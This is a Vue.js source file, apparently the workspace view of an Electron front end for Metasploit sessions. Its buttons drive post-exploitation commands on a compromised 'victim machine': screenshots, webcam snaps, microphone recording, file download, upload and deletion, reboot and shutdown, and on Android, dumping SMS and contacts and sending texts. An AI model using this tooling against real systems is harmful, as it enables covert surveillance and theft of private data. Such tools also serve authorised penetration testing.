<template>
   <div id="workspace">
     <el-tabs @tab-click="tabClicked" type="border-card">
       <el-tab-pane>
         <el-tooltip slot="label" class="item" content="System information" effect="dark" placement="top">
         <span><font-awesome-icon icon="desktop"/></span>
         </el-tooltip>
         <el-row :gutter="24">
           <el-col span="10">
             <div class="sysinfo" style="margin-bottom:10px;"
                  v-loading="sysinfoLoading"
                  element-loading-text="Fetching systerm information..."
                  element-loading-background="rgba(45, 58, 75, 0.8)">
               <h4 style="color:#fff;">System information: </h4>
               <table style="width:100%;" >
                 <tr v-for="info in sysinfo" style="font-size:14px;">
                   <td style="color:rgba(255, 255, 255, 0.7); padding:10px 0;">{{info[0]}}</td>
                   <td style="padding-left:60px; "><el-tag size="medium"> {{info[1]}} </el-tag></td>
                 </tr>
               </table>
             </div>
           </el-col>
           <el-col span="14">
             <div class="control-box">
               <el-row :gutter="24">
                 <el-col :span="12" v-if="this.$route.params.platform !== 'android'">
                   <h5 style="color:#fff;">User interface commands</h5>
                   <el-button type="primary" size="mini" style="margin-bottom: 10px;" @click="takeScreenshot">screenshot</el-button>
                 </el-col>
                 <el-col :span="12">
                   <h5 style="color:#fff">
                     System Commands
                   </h5>
                   <el-button type="primary" size="mini" style="margin-bottom: 10px;" @click="ps">Processes</el-button>
                   <el-button type="primary" size="mini" style="margin-bottom: 10px;" @click="deviceOff('reboot')" v-show="this.$route.params.platform === 'windows'">reboot</el-button>
                   <el-button type="primary" size="mini" style="margin-bottom: 10px;" @click="deviceOff('shutdown')" v-show="this.$route.params.platform === 'windows'">shutdown</el-button>
                 </el-col>
               </el-row>
               <el-row>
                 <el-col :span="24">
                   <div class="workspaceOutput" v-show="isWorkspace" v-loading="commandLoader"
                        :element-loading-text="'Fetching screenshot..'"
                        element-loading-background="rgba(45, 58, 75, 0.8)">
                     <img :src="workspaceImage" alt="" v-show="isWorkspaceImage" style="width:100%; cursor: pointer" @click="fullWidthImage = !fullWidthImage" draggable="false">
                   </div>
                 </el-col>
               </el-row>
             </div>
           </el-col>
         </el-row>
       </el-tab-pane>
       <el-tab-pane>
         <el-tooltip slot="label" class="item" content="File Manager" effect="dark" placement="top">
           <span><font-awesome-icon icon="folder-open"/></span>
         </el-tooltip>
         <el-table
                 ref="fileManagerTable"
                 v-loading="loadingTable"
                 style="width: 100%"
                 element-loading-text="Fetching directories"
                 element-loading-background="rgba(45, 58, 75, 0.8)"
                 :data="listData.filter(data => !search || data.name.toLowerCase().includes(search.toLowerCase()))"
                 fit
                 :cell-style="tableCellStyle"
                 :header-cell-style="tableHeaderColor">
           <el-table-column
                   prop="file"
                   width="38"
                   align="center">
             <template slot-scope="scope">
               <div slot="file" class="name-wrapper">
                 <el-button type="text" style="color: inherit;" @click="FileHandler(scope.$index, scope.row)"><font-awesome-icon :icon="scope.row.file === 'up' ? 'level-up-alt' : scope.row.file ==='empty' ? '' : scope.row.file === 'dir' ? 'folder' : 'file-alt'" size="lg" pull="right"
                                                                                                                                 :flip="scope.row.file === 'up' ? 'horizontal' : ''"/>
                 </el-button>
               </div>
             </template>
           </el-table-column>
           <el-table-column
                   prop="name"
                   label="Name"
                   min-width="140">
             <template slot-scope="scope">
               <div slot="name" class="name-wrapper">
                 <el-button type="text" class="dir-file" style="color: inherit;" @click="FileHandler(scope.$index, scope.row)"> {{scope.row.name}} </el-button>
               </div>
             </template>
           </el-table-column>
           <el-table-column
                   prop="size"
                   label="Size">
             <template slot-scope="scope">
               <div slot="reference" class="name-wrapper">
                 <el-tag size="medium" type="warning" v-if="scope.$index !== 0 && scope.row.file !== 'empty'">{{ scope.row.size }}</el-tag>
               </div>
             </template>
           </el-table-column>
           <el-table-column
                   prop="mode"
                   label="Mode">
             <template slot-scope="scope">
               <div slot="reference" class="name-wrapper">
                 <el-tag size="danger" v-if="scope.$index !== 0 && scope.row.file !== 'empty'">{{ scope.row.mode }}</el-tag>
               </div>
             </template>
           </el-table-column>
           <el-table-column
                   align="right">
             <template slot="header" slot-scope="scope">
               <el-popover
                       placement="top"
                       width="200"
                       trigger="click"
                       popper-class="popper-bg">
                 <el-upload
                         ref="upload"
                         style="color:#fff; text-align: center;"
                         action=""
                         :http-request="uploadFiles"
                         :before-upload="beforeUploadFile"
                         :limit="1"
                         :file-list="fileList">
                   <el-button size="small" type="primary">Click to upload</el-button>
                 </el-upload>
                 <el-tooltip content="Upload" placement="top"  slot="reference">
                   <el-button
                           type="primary"
                           size="small"
                           circle
                           icon="el-icon-upload2"></el-button>
                 </el-tooltip>
               </el-popover>
               <el-popover
                       placement="top"
                       width="240"
                       trigger="click"
                       popper-class="popper-bg">
                 <el-form :inline="true" :model="createFolderForm" ref="createFolderForm">
                   <el-form-item
                           prop="folderName"
                           :rules="[
                                { required: true, message: 'Folder name is required', trigger: 'blur'}
                              ]">
                     <el-input
                             size="small"
                             placeholder="Folder name"
                             v-model="createFolderForm.folderName">
                     </el-input>
                   </el-form-item>
                   <el-form-item>
                     <el-button type="primary"
                                size="small"
                                circle
                                :loading="createFolderBtn"
                                icon="el-icon-circle-plus-outline"
                                @click="createFolder('createFolderForm')"></el-button>
                   </el-form-item>
                 </el-form>
                 <el-tooltip content="Create folder" placement="top" slot="reference">
                   <el-button
                           type="primary"
                           size="small"
                           circle><font-awesome-icon icon="folder-plus"/></el-button>
                 </el-tooltip>
               </el-popover>
               <el-tooltip content="Refresh" placement="top">
                 <el-button
                         type="primary"
                         size="small"
                         circle
                         icon="el-icon-refresh"
                         @click="updateDirectory()"></el-button>
               </el-tooltip>
             </template>
             <template slot-scope="scope">
               <el-tooltip v-if="scope.row.file !== 'dir' && scope.row.file !== 'up' && scope.row.file !=='empty'" class="item" effect="dark" content="Download" placement="left" :enterable="false">
                 <el-button
                         v-if="scope.row.file !== 'dir' && scope.row.file !== 'up' && scope.row.file !=='empty'"
                         type="primary"
                         size="mini"
                         circle
                         :loading="(scope.$index + '2') === loadingButton"
                         @click="downloadFiles(scope.$index, scope.row)" icon="el-icon-download"/>
               </el-tooltip>
               <el-tooltip class="item" effect="dark" content="Remove" placement="left" :enterable="false">
                 <el-button
                         v-if="scope.row.file !== 'up' && scope.row.file !=='empty'"
                         size="mini"
                         type="danger"
                         circle
                         :loading="scope.$index === loadingButton"
                         @click="removeFiles(scope.$index, scope.row)" icon="el-icon-delete"/>
               </el-tooltip>
             </template>
           </el-table-column>
         </el-table>
       </el-tab-pane>
       <el-tab-pane>
         <el-tooltip slot="label" content="Networking" effect="dark" placement="top">
           <font-awesome-icon icon="server"/>
         </el-tooltip>
           <h5 style="color:#fff">
             Networking Commands
           </h5>
           <el-button type="primary" size="mini" style="margin-bottom: 10px;" @click="networkingCommand('ifconfig')">ifconfig</el-button>
           <el-button type="primary" size="mini" style="margin-bottom: 10px;" @click="networkingCommand('netstat')" v-show="this.$route.params.platform === 'windows'">netstat</el-button>
           <el-button type="primary" size="mini" style="margin-bottom: 10px;" @click="networkingCommand('route')">route</el-button>
           <div class="commandDisplay" style="background-color: rgba(34, 34, 34, 0.7); padding:0 10px;" v-show="commandShower" v-loading="commandLoader"
                element-loading-text="Fetching Network information..."
                element-loading-background="rgba(45, 58, 75, 0.8)">
                    <pre style="user-select:text;">
                     <code>
{{commandDisplay}}
                     </code>
                    </pre>
           </div>
       </el-tab-pane>
       <el-tab-pane>
         <el-tooltip slot="label" content="Webcam" effect="dark" placement="top">
           <font-awesome-icon icon="camera"/>
         </el-tooltip>
         <el-select v-model="selected" placeholder="Select" size="small">
           <el-option
                   v-for="item in camera"
                   :key="item.value"
                   :label="item.label"
                   :value="item.value">
           </el-option>
         </el-select>
         <el-button type="primary" size="small" circle @click="snap">
           <font-awesome-icon icon="camera"/>
         </el-button>
         <el-row :gutter="24">
           <el-col span="24">
             <div style="width: 100%; padding:50px 0;"  v-loading="snapLoader"
                  element-loading-text="Fetching snapshot..."
                  element-loading-background="rgba(45, 58, 75, 0.8)">
               <div class="img" style="max-width: 800px">
                  <img :src="snapImage" v-show="snapShow" style="width:100%;" draggable="false">
               </div>
             </div>
           </el-col>
         </el-row>
       </el-tab-pane>
       <el-tab-pane>
         <el-tooltip slot="label" content="Microphone" effect="dark" placement="top">
           <font-awesome-icon icon="microphone-alt"/>
         </el-tooltip>
         <el-form :inline="true" :model="recordForm" ref="recordForm">
           <el-form-item>
             <el-input v-model="recordForm.secs" size="small" placeholder="5"></el-input>
             <small style="color:#f3f3f3">Record microphone, default is 5 secs</small>
           </el-form-item>
           <el-form-item>
             <el-button type="primary" size="small" :loading="recordLoading" @click="Record">start</el-button>
           </el-form-item>
         </el-form>
       </el-tab-pane>
       <el-tab-pane v-if="this.$route.params.platform === 'android'" >
         <el-tooltip slot="label" content="SMS" effect="dark" placement="top">
           <font-awesome-icon icon="comment-alt"/>
         </el-tooltip>
         <el-card class="box-card sms">
           <div slot="header" class="clearfix">
             <span>Sms</span>
             <el-button-group style="float: right; margin-top: -15px;">
             <el-button type="primary" size="mini" @click="() => { this.smsArea1 = true; this.smsArea2 = false }">New sms</el-button>
             <el-button type="primary" size="mini" @click="dumpSms" :loading="smsLoader">Get sms</el-button>
             </el-button-group>
           </div>
           <div class="send-sms" v-show="smsArea1">
             <el-form :model="smsForm" ref="smsForm" :rules="smsRules">
               <el-form-item prop="smsTo">
               <el-input v-model="smsForm.smsTo" size="small" placeholder="to" autocomplete="off" style="max-width: 500px;"></el-input>
               </el-form-item>
               <el-form-item prop="smsMsg">
               <el-input
                       type="textarea"
                       :rows="2"
                       placeholder="Message..."
                       style="resize: none; max-width: 500px;"
                       v-model="smsForm.smsMsg">
               </el-input>
               </el-form-item>
               <el-form-item>
               <el-button type="primary" size="mini" @click="newSms('smsForm')">Send</el-button>
               </el-form-item>
             </el-form>
           </div>
           <div v-for="sms in smsData" :key="o" class="sms-item" v-show="smsArea2">
             <span class="sms-title"><small>{{sms.title}}</small></span>
             <span class="sms-text">{{sms.msg}}</span>
             <span class="sms-date"><small>{{sms.date}}</small></span>
           </div>
         </el-card>
       </el-tab-pane>
       <el-tab-pane v-if="this.$route.params.platform === 'android'">
         <el-tooltip slot="label" content="Contacts" effect="dark" placement="top">
           <font-awesome-icon icon="users"/>
         </el-tooltip>
         <el-card class="box-card">
           <div slot="header" class="clearfix">
             <span>Contacts</span>
             <el-button style="float: right; margin-top: -5px;" type="primary" size="mini" @click="dumpContacts" :loading="contactLoader">Get Contacts</el-button>
           </div>
           <div v-for="contact in contactsData" :key="o">
             <span class="contact">{{contact.name }}</span><span class="contact">{{contact.number }}</span>
             <span class="contact" v-if="contact.number !== ''">
             <el-popover
                    placement="top"
                    width="200"
                    trigger="click"
                    popper-class="popper-bg">
               <el-input
                       type="textarea"
                       :rows="2"
                       placeholder="Message..."
                       style="resize: none;"
                       v-model="textareaSms">
                </el-input>
               <el-button type="primary" size="mini" style="margin-top:10px;" @click="sendSms(contact.number)">Send</el-button>
               <el-tooltip slot="reference" content="Send SMS" effect="dark" placement="right" :enterable="false">
                <el-button type="primary" size="small" circle><font-awesome-icon icon="paper-plane"/></el-button>
               </el-tooltip>
             </el-popover>
             </span>
           </div>
         </el-card>
       </el-tab-pane>
     </el-tabs>
     <el-dialog
             custom-class="file-reader-dialog"
             :title="FileContentReader.fileTitle"
             :visible.sync="FileContentReader.isOpen"
             width="70%">
       <pre style="user-select:text;">
         <code>
{{FileContentReader.fileContent}}
         </code>
       </pre>
       <span slot="footer" class="dialog-footer">
        <el-button type="primary" size="small" @click="FileContentReader.isOpen = false">Cancel</el-button>
       </span>
     </el-dialog>
     <el-dialog
       custom-class="image-viewer-dialog"
       :visible.sync="fullWidthImage"
        width="80%">
       <img :src="workspaceImage" alt="" v-show="isWorkspaceImage" style="width:100%;" draggable="false">
     </el-dialog>
   </div>
</template>

<script>
  import MsfRpc from '@/msfrpc'
  import * as Cmd from './../../constants/commands/cmd'
  import * as Whitelisted from './../../constants/extensions/whitelist'
  import fs from 'fs'
  export default {
    name: 'Workspace',
    data () {
      return {
        isWorkspace: false,
        workspaceOutput: '',
        workspaceImage: '',
        snapLoader: false,
        snapShow: false,
        snapImage: '',
        fullWidthImage: false,
        createFolderBtn: false,
        createFolderForm: {
          folderName: ''
        },
        fileList: [],
        listData: [],
        pathDir: '',
        loadingTable: false,
        loadingButton: '',
        sysinfo: [],
        sysinfoLoading: false,
        FileContentReader: {
          isOpen: false,
          fileTitle: '',
          fileContent: ''
        },
        commandDisplay: '',
        commandLoader: false,
        commandShower: false,
        recordForm: {
          secs: ''
        },
        recordLoading: false,
        camera: [{
          value: '1',
          label: 'Front camera'
        }, {
          value: '2',
          label: 'Back camera'
        }],
        selected: '',
        smsLoader: false,
        smsData: [],
        smsForm: {
          smsTo: '',
          smsMsg: ''
        },
        smsRules: {
          smsTo: [
            {required: true, message: 'Enter phone number', trigger: 'blur'}
          ],
          smsMsg: [
            {required: true, message: 'Enter message', trigger: 'blur'}
          ]
        },
        smsArea1: true,
        smsArea2: false,
        contactLoader: false,
        contactsData: [],
        textareaSms: ''
      }
    },
    methods: {
      tabClicked (clicked) {
        if (clicked.index === '1') {
          try {
            // solving the issue of re-rendering the table in element-ui
            this.listData = []
            this.$refs.fileManagerTable.tableData.forEach((dir) => {
              this.listData.push({
                name: dir.name,
                file: dir.file,
                size: dir.size,
                mode: dir.mode
              })
            })
          } catch (e) {
            console.log(e)
            this.$notify.error({
              title: 'Error',
              message: 'Seems like session closed'
            })
          }
        }
      },
      tableHeaderColor ({row, column, rowIndex, columnIndex}) {
        // header table design
        if (rowIndex === 0 || rowIndex === 1) {
          return ' background-color: #314052; !important; border-right:none; border-left:none; color:rgba(255, 255, 255, 0.7); padding:0px; border-bottom:1px solid hsla(0,0%,100%,.05);'
        }
      },
      tableCellStyle ({row, column, rowIndex, columnIndex}) {
        // cols design
        return 'background-color: #314052; border:none; color: rgba(255, 255, 255, 0.7); padding:0'
      },
      async networkingCommand (command) {
        // executing netstat command
        this.commandShower = true
        this.commandLoader = true
        this.commandDisplay = await this.msfrpc.executeCommand(this.$route.params.sessionId, `${command}`)
        this.commandLoader = false
      },
      async ps () {
        // executing ps command
        this.FileContentReader.isOpen = true
        this.FileContentReader.fileTitle = ''
        this.FileContentReader.fileContent = ''
        const loading = this.$loading({
          lock: true,
          target: '.el-dialog',
          text: 'Reading file...',
          background: 'rgba(45, 58, 75, 0.8)'
        })
        const content = await this.msfrpc.executeCommand(this.$route.params.sessionId, `${Cmd.PS}`)
        loading.close()
        this.FileContentReader.fileTitle = 'Running processes'
        this.FileContentReader.fileContent = content
      },
      async deviceOff (command) {
        this.$confirm(`This will ${command} host. Continue?`, 'Warning', {
          confirmButtonText: 'DO IT',
          cancelButtonText: 'Cancel',
          type: 'warning'
        }).then(() => {
          this.msfrpc.executeCommand(this.$route.params.sessionId, `${command}`).then((response) => {
            this.$message.success(response.replace('[*] ', ''))
          })
        }).catch(() => {
          this.$message({
            type: 'info',
            message: 'Process canceled'
          })
        })
      },
      async Record () {
        let sec = this.recordForm.secs
        sec = sec.length === 0 ? 5 : sec
        let regx = /^\d+$/
        if (!regx.test(sec)) {
          this.$notify.error({
            title: 'Error',
            message: `Enter valid secs number to record`
          })
          return false
        }
        let pathTo = this.$electron.remote.app.getPath('home') + '/kage'
        pathTo += '/' + Math.random().toString(36).substring(5) + '-record.wav'
        this.recordLoading = true
        await this.msfrpc.executeCommand(this.$route.params.sessionId, `${Cmd.RECORD_MIC} -d ${sec} -f ${pathTo} -p true`)
        setTimeout(() => {
          // reading command output to remove it from command queues
          this.msfrpc._readCommand(this.$route.params.sessionId)
          this.$message.success(`Record has been saved in: ${pathTo}`)
          console.log(pathTo)
          this.recordLoading = false
        }, sec * 1000)
      },
      async snap () {
        if (this.selected.length !== 0) {
          this.snapLoader = true
          console.log(this.selected)
          const index = parseInt(this.selected)
          let whichCamera = index === 1 ? 'front-camera' : 'back-camera'
          let pathTo = this.$electron.remote.app.getPath('home') + '/kage'
          pathTo += '/' + Math.random().toString(36).substring(5) + `-${whichCamera}.jpeg`
          //  webcam_snap -i 1 -p /home/user/Documents/kage/[randomname].jpeg -v false
          console.log(index)
          const response = await this.msfrpc.executeCommand(this.$route.params.sessionId, `${Cmd.WEBCAM_SNAP} -i ${index} -p ${pathTo} -v false`)
          console.log(response)
          if (response.indexOf('Operation') > -1 && response.indexOf('[+]') <= -1) {
            this.snapLoader = false
            this.$notify.error({
              title: 'Operation failed',
              message: `Failed to take snap from ${whichCamera.replace('-', ' ')}`
            })
            return false
          }
          this.snapShow = true
          try {
            setTimeout(() => {
              this.snapImage = 'data:image/jpeg;base64,' + this.getEncodedFile(pathTo, 'base64')
              this.$message.success(`displaying image from ${whichCamera.replace('-', ' ')}`)
            }, 1000)
          } catch (e) {
            console.log(e)
          }
          this.snapLoader = false
        }
      },
      async takeScreenshot () {
        this.workspaceImage = ''
        this.isWorkspace = true
        this.isWorkspaceOutput = false
        this.isWorkspaceImage = true
        this.commandLoader = true
        let pathTo = this.$electron.remote.app.getPath('home') + '/kage'
        pathTo += '/' + Math.random().toString(36).substring(5) + '-screenshot.jpeg'
        //  screenshot -p /home/user/Documents/kage/[randomname].jpeg -v false
        const response = await this.msfrpc.executeCommand(this.$route.params.sessionId, `${Cmd.SCREENSHOT} -p ${pathTo} -v false`)
        this.$message.success(response.replace('[*] ', ''))
        // converting image to base64 to display it
        this.workspaceImage = 'data:image/jpeg;base64,' + this.getEncodedFile(pathTo, 'base64')
        this.commandLoader = false
      },
      getEncodedFile (file, encode) {
        try {
          return fs.readFileSync(file, {encoding: encode})
        } catch (e) {
          console.log(e)
        }
      },
      async uploadFiles (File) {
        const response = await this.msfrpc.executeCommand(this.$route.params.sessionId, `${Cmd.UPLOAD} '${File.file.path}'`)
        if (response.indexOf('Operation') > -1) {
          let error = response.substr(response.lastIndexOf(':') + 1, response.length - 1)
          this.$notify.error({
            title: 'Operation failed',
            message: error
          })
        } else {
          this.$refs.upload.clearFiles()
          this.$message.success(response.replace('[*] ', ''))
          // check the data comming back with response.data later
          this.updateDirectory()
        }
      },
      beforeUploadFile (file) {
        return this.$confirm(`Are you sure you want to upload ${file.name} ?`, 'Warning', {
          confirmButtonText: 'YES',
          cancelButtonText: 'No',
          type: 'warning'
        }).then(() => true)
      },
      async createFolder (formName) {
        this.createFolderBtn = true
        this.$refs[formName].validate((valid) => {
          if (valid) {
            this.$refs[formName].clearValidate()
            this.msfrpc.executeCommand(this.$route.params.sessionId, `${Cmd.MKDIR} '${this.createFolderForm.folderName}'`).then((response) => {
              if (response.data.indexOf('Operation') > -1) {
                let error = response.data.substr(response.data.lastIndexOf(':') + 1, response.data.length - 1)
                this.$notify.error({
                  title: 'Operation failed',
                  message: error
                })
                this.createFolderBtn = false
              } else {
                this.$message.success(response.data.replace('[*] ', ''))
                this.updateDirectory()
                this.createFolderBtn = false
              }
              this.createFolderForm.folderName = ''
            })
          } else {
            this.createFolderBtn = false
            return false
          }
        })
      },
      async downloadFiles (index, row) {
        let pathTo = this.$electron.remote.app.getPath('home') + '/kage'
        this.loadingButton = index + '2'
        const response = await this.msfrpc.executeCommand(this.$route.params.sessionId, `${Cmd.DOWNLOAD} '${row.name}' ${pathTo}`)
        if (response.data.indexOf('Operation') > -1) {
          let error = response.data.substr(response.data.lastIndexOf(':') + 1, response.data.length - 1)
          this.$notify.error({
            title: 'Operation failed',
            message: error
          })
          this.loadingButton = ''
        } else {
          this.$message.success(response.data.replace('[*] ', ''))
          this.updateDirectory()
          this.loadingButton = ''
        }
      },
      async removeFiles (index, row) {
        let removeCommand = row.file === 'dir' ? Cmd.RM_DIR : Cmd.RM
        this.loadingButton = index
        const response = await this.msfrpc.executeCommand(this.$route.params.sessionId, `${removeCommand}'${row.name}'`)
        if (response.data.indexOf('Operation') > -1) {
          let error = response.data.substr(response.data.lastIndexOf(':') + 1, response.data.length - 1)
          this.$notify.error({
            title: 'Operation failed',
            message: error
          })
          this.loadingButton = ''
        } else {
          console.log(response)
          this.$message.success(`${row.name} deleted from victim machine.`)
          this.updateDirectory()
          this.loadingButton = ''
        }
      },
      async FileHandler (index, row) {
        if (row.file === 'dir' || row.file === 'up') {
          this.loadingTable = true
          let response = await this.msfrpc.executeCommand(this.$route.params.sessionId, `${Cmd.CD} '${row.name}'`)
          response = response.data
          if ((response.indexOf('Operation') > -1)) {
            let error = response.substr(response.lastIndexOf(':') + 1, response.length - 1)
            this.$notify.error({
              title: 'Operation failed',
              message: error
            })
            this.loadingTable = false
          } else {
            this.updateDirectory()
          }
        } else if (row.file === 'fil') {
          let ext = row.name.split('.').pop()
          if (Whitelisted.extensions.indexOf(ext) > -1) {
            if (parseInt(row.size, 10) < 30) {
              this.FileContentReader.isOpen = true
              this.FileContentReader.fileTitle = ''
              this.FileContentReader.fileContent = ''
              const loading = this.$loading({
                lock: true,
                target: '.el-dialog',
                text: 'Reading file...',
                background: 'rgba(45, 58, 75, 0.8)'
              })
              const content = await this.msfrpc.executeCommand(this.$route.params.sessionId, `${Cmd.CAT} '${row.name}'`)
              loading.close()
              this.FileContentReader.fileTitle = row.name
              this.FileContentReader.fileContent = content
            } else {
              this.$notify.error({
                title: 'Error',
                message: 'File content is really big can\'t display it, download it if you are interested.'
              })
            }
          }
        }
      },
      async dumpSms () {
        this.smsData = []
        this.smsArea1 = false
        this.smsArea2 = true
        this.smsLoader = true
        let pathTo = this.$electron.remote.app.getPath('home') + '/kage'
        pathTo += '/' + Math.random().toString(36).substring(5) + '-sms.txt'
        const response = await this.msfrpc.executeCommand(this.$route.params.sessionId, `${Cmd.DUMP_SMS} -o ${pathTo}`)
        if (response.data.indexOf('No sms') > -1) {
          this.$message.warning(response.data.replace('[*] ', ''))
          this.smsLoader = false
          return false
        }
        this.$message.success(response.data.replace(/\[.*?\]/g, ''))
        setTimeout(() => {
          const content = this.getEncodedFile(pathTo, 'utf8')
          this.smsData = this.msfrpc._formater(content, 'sms')
          this.smsLoader = false
        //  increase timeout if sms file is big
        }, 1000)
      },
      newSms (formName) {
        this.$refs[formName].validate(async (valid) => {
          if (valid) {
            /* eslint-disable no-useless-escape */
            const phoneNumber = /(([+]?[(]?[0-9]{1,3}[)]?)|([(]?[0-9]{4}[)]?))\s*[)]?[-\s\.]?[(]?[0-9]{1,3}[)]?([-\s\.]?[0-9]{3})([-\s\.]?[0-9]{3,4})/g
            if (!this.smsForm.smsTo.match(phoneNumber)) {
              this.$notify.error({
                title: 'Error',
                message: 'Invalid phone number'
              })
              return false
            }
            this.$refs[formName].clearValidate()
            const response = await this.msfrpc.executeCommand(this.$route.params.sessionId, `send_sms -d '${this.smsForm.smsTo}' -t '${this.smsForm.smsMsg}'`)
            if (response.indexOf('[+]') > -1) {
              this.$message.success(response.replace('[+] ', ''))
              this.$refs[formName].resetFields()
              return true
            }
            this.$notify.error({
              title: 'Error',
              message: `Couldn't send message to ${this.smsForm.smsTo}, Message field cannot be empty.`
            })
            console.log(response)
            return false
          } else {
            return false
          }
        })
      },
      async sendSms (number) {
        const response = await this.msfrpc.executeCommand(this.$route.params.sessionId, `send_sms -d '${number}' -t '${this.textareaSms}'`)
        if (response.indexOf('[+]') > -1) {
          this.$message.success(response.replace('[+] ', ''))
          this.textareaSms = ''
          return true
        }
        this.$notify.error({
          title: 'Error',
          message: `Couldn't send message to ${number}, Message field cannot be empty.`
        })
        console.log(response)
        return false
      },
      async dumpContacts () {
        this.contactsData = []
        this.contactLoader = true
        let pathTo = this.$electron.remote.app.getPath('home') + '/kage'
        pathTo += '/' + Math.random().toString(36).substring(5) + '-contacts.txt'
        const response = await this.msfrpc.executeCommand(this.$route.params.sessionId, `${Cmd.DUMP_CONTACTS} -o ${pathTo}`)
        if (response.data.indexOf('No contacts') > -1) {
          this.$message.warning(response.data.replace('[*] ', ''))
          this.contactLoader = false
          return false
        }
        this.$message.success(response.data.replace(/\[.*?\]/g, ''))
        const content = this.getEncodedFile(pathTo, 'utf8')
        this.contactsData = this.msfrpc._formater(content, 'contact')
        this.contactLoader = false
      },
      async bootStartups () {
        this.sysinfoLoading = true
        const systemInformation = await this.msfrpc._startUp(this.$route.params.sessionId, Cmd.SYSINFO)
        console.log(systemInformation)
        try {
          systemInformation.forEach((info) => {
            let divider = info.split(':')
            this.sysinfo.push(divider)
          })
        } catch (e) {
          console.log(e)
          this.$notify.error({
            title: 'Error',
            message: 'Seems like session closed.'
          })
          setTimeout(() => this.$router.push({
            path: '/sessions'
          }), 500)
        }
        this.sysinfoLoading = false
        this.loadingTable = true
        const Dirs = await this.msfrpc._startUp(this.$route.params.sessionId, Cmd.LS)
        this.listData = [{
          name: '..',
          file: 'up',
          size: '',
          mode: ''
        }]
        console.log(typeof Dirs)
        console.log(Dirs)
        if (typeof Dirs === 'string') {
          try {
            if (Dirs.indexOf('Operation') > -1) {
              if (this.$route.params.platform === 'android') {
                await this.msfrpc.executeCommand(this.$route.params.sessionId, Cmd.CD + '/')
              } else {
                await this.msfrpc.executeCommand(this.$route.params.sessionId, Cmd.CD + '..')
              }
              let error = Dirs.substr(Dirs.lastIndexOf(':') + 1, Dirs.length - 1)
              if (Dirs.indexOf('1') > -1) {
                error = 'Permission denied'
              }
              this.$notify.error({
                title: 'Operation failed',
                message: error
              })
              this.updateDirectory()
              return false
            } else {
              this.listData.push({
                name: 'Empty folder',
                file: 'empty',
                size: '',
                mode: ''
              })
              this.loadingTable = false
              return false
            }
          } catch (e) {
            this.$notify.error({
              title: 'Error',
              message: 'Seems like session closed'
            })
          }
        }
        try {
          Dirs.forEach((dir) => {
            this.listData.push({
              name: dir.name,
              file: dir.file,
              size: dir.size + ' KB',
              mode: dir.mode
            })
          })
        } catch (e) {
          console.log(e)
          this.$notify.error({
            title: 'Error',
            message: 'Seems like session closed'
          })
        }
        this.loadingTable = false
      },
      async updateDirectory () {
        this.loadingTable = true
        const Dirs = await this.msfrpc.executeCommand(this.$route.params.sessionId, Cmd.LS)
        this.listData = [{
          name: '..',
          file: 'up',
          size: '',
          mode: ''
        }]
        console.log(typeof Dirs)
        console.log(Dirs)
        if (typeof Dirs === 'string') {
          try {
            if (Dirs.indexOf('Operation') > -1) {
              console.log(Dirs)
              if (this.$route.params.platform === 'android') {
                await this.msfrpc.executeCommand(this.$route.params.sessionId, Cmd.CD + '/')
              } else {
                await this.msfrpc.executeCommand(this.$route.params.sessionId, Cmd.CD + '..')
              }
              let error = Dirs.substr(Dirs.lastIndexOf(':') + 1, Dirs.length - 1)
              if (Dirs.indexOf('1') > -1) {
                error = 'Permission denied'
              }
              this.$notify.error({
                title: 'Operation failed',
                message: error
              })
              this.updateDirectory()
              return false
            } else {
              this.listData.push({
                name: 'Empty folder',
                file: 'empty',
                size: '',
                mode: ''
              })
              this.loadingTable = false
              return false
            }
          } catch (e) {
            this.$notify.error({
              title: 'Error',
              message: 'Seems like session closed'
            })
          }
        }
        try {
          Dirs.forEach((dir) => {
            this.listData.push({
              name: dir.name,
              file: dir.file,
              size: dir.size + ' KB',
              mode: dir.mode
            })
          })
        } catch (e) {
          console.log(e)
          this.$notify.error({
            title: 'Error',
            message: 'Seems like session closed'
          })
        }
        this.loadingTable = false
      }
    },
    async created () {
      this.listData = [{
        name: '..',
        file: 'up',
        size: '',
        mode: ''
      }]
      this.msfrpc = new MsfRpc(this.$store.getters.getInfo)
      this.bootStartups()
    }
  }
</script>

<style scoped>
  #workspace {
   margin: 30px 0;
  }
  .el-table {
    border: 1px solid hsla(0,0%,100%,.05);
    -webkit-box-shadow: none !important;
    background-color: #314052;
    box-shadow: 0 2px 12px 0 rgba(0,0,0,.1) !important;
  }
  .workspaceOutput {
    padding:10px;
    margin-top: 20px;
  }
  .dir-file:hover {
    text-decoration: underline;
  }
  .control-box {
    padding:5px 10px;
    border: 1px solid hsla(0,0%,100%,.05);
    color: rgba(255, 255, 255, 0.7);
    background-color: #314052;
    box-shadow: 0 2px 12px 0 rgba(0,0,0,.1);
    min-height:100px;
    margin-bottom: 10px;
  }
  .control-box h4 {
    padding-bottom: 5px;
  }
  .sysinfo {
    padding:5px 10px;
    border: 1px solid hsla(0,0%,100%,.05);
    color: rgba(255, 255, 255, 0.7);
    background-color: #314052;
    box-shadow: 0 2px 12px 0 rgba(0,0,0,.1);
    min-height:100px;
  }
  .sysinfo h4 {
    border-bottom:1px solid hsla(0,0%,100%,.05);
    padding-bottom: 9px;
  }
  .sysinfo table {
    border-collapse: collapse;
    width: 100%;
  }
  .el-dialog__wrapper >>> .file-reader-dialog {
    background-color:#37465b !important; color:rgba(255, 255, 255, 0.7);
  }
  .el-dialog__wrapper >>> .image-viewer-dialog {
    background-color: rgba(255, 225, 225, 0) !important;
    box-shadow: none;
  }
  .el-dialog__wrapper >>> .el-dialog__header span {
    color:rgba(255, 255, 255, 0.7);
  }
  .el-dialog__wrapper >>> .el-dialog__body pre{
    border:1px solid hsla(0,0%,100%,.1);
    background-color: rgba(34, 34, 34, 0.7);
    padding:0 10px;
    color: #fff;
    overflow-x: auto;
  }
  .el-form--inline >>> .el-form-item {
    margin-bottom: 10px;
  }
  .el-form--inline >>> input{
    background-color:#283443;
    border: 1px solid hsla(0,0%,100%,.1);
    color:#fff;
  }
  .el-form--inline >>> input:hover {
    border-color: #c0c4cc;
  }
  .el-input.el-input--small >>> input {
    background-color:#283443;
    border: 1px solid hsla(0,0%,100%,.1);
    color:#fff;
  }
  .el-input.el-input--small >>> input:hover {
    border-color: #c0c4cc;
  }
  .el-select >>> input {
    background-color:#283443;
    border: 1px solid hsla(0,0%,100%,.1);
    color:#fff;
  }
  .el-select >>> input:hover {
    border-color: #c0c4cc;
  }
  .el-tabs {
    background-color: #37465b;
    color:#fff;
    border: none;
  }
  .el-tabs >>> .el-tabs__header {
    background-color: #314052;
    border: none;
  }
